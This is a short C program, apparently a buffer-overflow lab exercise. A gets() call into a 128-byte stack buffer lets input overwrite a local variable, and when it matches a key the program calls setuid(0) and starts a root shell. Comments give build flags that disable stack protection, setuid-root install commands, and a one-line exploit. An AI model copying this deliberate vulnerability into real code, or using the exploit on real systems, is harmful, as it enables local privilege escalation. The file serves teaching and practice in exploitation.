#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x61616161

// COMPILE $ gcc -fno-stack-protector bof1.c -o bof1
// SETUID  $ sudo chown root:root bof1
//         $ sudo chmod 4755 bof1
// EXPLOIT $ (python -c "print 'a'*144";cat) | ./bof1

void vuln() {
    int innocent;
    char buf[BUF_SIZE];

    puts("\033[32m" "enter your name :)" "\033[0m");
    gets(buf);
    printf("Hello " "\033[33m" "%s" "\033[0m" "!\n", buf);

    if (innocent  == KEY) {
        if (setuid(0)) {
            perror("setuid");
            return 1;
        }
        system("/bin/sh");
    }
}

int main(){
    vuln();
    return 0;
}
